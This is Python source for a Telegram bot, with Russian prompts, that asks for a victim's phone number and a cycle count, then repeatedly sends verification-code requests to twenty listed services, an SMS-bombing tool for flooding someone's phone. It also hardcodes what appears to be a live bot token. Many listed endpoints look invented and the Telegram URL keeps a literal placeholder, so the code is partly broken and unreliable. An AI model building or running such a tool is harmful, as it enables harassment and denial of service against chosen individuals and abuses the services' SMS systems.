import asyncio
import logging
import random
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message

TOKEN = "8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE"

class SpamState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()

SERVICES = [
    {"name": "Telegram", "url": "https://api.telegram.org/botTOKEN/sendCode", "method": "post", "data": {"phone_number": "[phone]"}},
    {"name": "WhatsApp", "url": "https://api.whatsapp.com/sendcode", "method": "get", "params": {"phone": "[phone]"}},
    {"name": "Viber", "url": "https://api.viber.com/sendcode", "method": "post", "data": {"number": "[phone]"}},
    {"name": "TikTok", "url": "https://api.tiktok.com/sendcode", "method": "post", "data": {"mobile": "[phone]"}},
    {"name": "Instagram", "url": "https://api.instagram.com/sendcode", "method": "post", "data": {"phone_number": "[phone]"}},
    {"name": "Facebook", "url": "https://api.facebook.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Google", "url": "https://api.google.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
    {"name": "Apple", "url": "https://api.apple.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
    {"name": "Microsoft", "url": "https://api.microsoft.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Amazon", "url": "https://api.amazon.com/sendcode", "method": "post", "data": {"phoneNumber": "[phone]"}},
    {"name": "Alibaba", "url": "https://api.alibaba.com/sendcode", "method": "post", "data": {"mobile": "[phone]"}},
    {"name": "Tencent", "url": "https://api.tencent.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Baidu", "url": "https://api.baidu.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Yandex", "url": "https://api.yandex.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Mail.ru", "url": "https://api.mail.ru/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Rambler", "url": "https://api.rambler.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Uber", "url": "https://api.uber.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Delivery", "url": "https://api.delivery.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Food", "url": "https://api.food.com/sendcode", "method": "post", "data": {"phone": "[phone]"}},
    {"name": "Taxi", "url": "https://api.taxi.com/sendcode", "method": "post", "data": {"phone": "[phone]"}}
]

def send_request(service, phone):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    try:
        url = service["url"].replace("[phone]", phone)
        if service["method"] == "get":
            resp = session.get(url, params=service.get("params", {}), timeout=10)
        else:
            data = service.get("data", {})
            for k, v in data.items():
                data[k] = v.replace("[phone]", phone)
            resp = session.post(url, json=data, timeout=10)
        return resp.status_code
    except:
        return 0

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("Отправь /spam")

@dp.message(Command("spam"))
async def spam_cmd(message: Message, state: FSMContext):
    await state.set_state(SpamState.waiting_phone)
    await message.answer("Введи номер (+77771234567)")

@dp.message(SpamState.waiting_phone)
async def phone_received(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("Некорректный номер")
        return
    await state.update_data(phone=phone)
    await state.set_state(SpamState.waiting_count)
    await message.answer("Количество циклов (число)")

@dp.message(SpamState.waiting_count)
async def count_received(message: Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0:
            await message.answer("Положительное число")
            return
    except ValueError:
        await message.answer("Введи число")
        return
    data = await state.get_data()
    phone = data.get("phone")
    await state.clear()
    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 20 сервисов")
    asyncio.create_task(spam_worker(message, phone, count))

async def spam_worker(message: Message, phone: str, count: int):
    total = 0
    for cycle in range(count):
        for service in SERVICES:
            status = send_request(service, phone)
            total += 1
            if status == 200 or status == 201:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> OK (200)")
            else:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> {status}")
            await asyncio.sleep(random.randint(2, 5))
        await message.answer(f"Цикл {cycle+1}/{count} завершён. Пауза 10 сек.")
        await asyncio.sleep(10)
    await message.answer(f"Готово. Отправлено {total} запросов.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
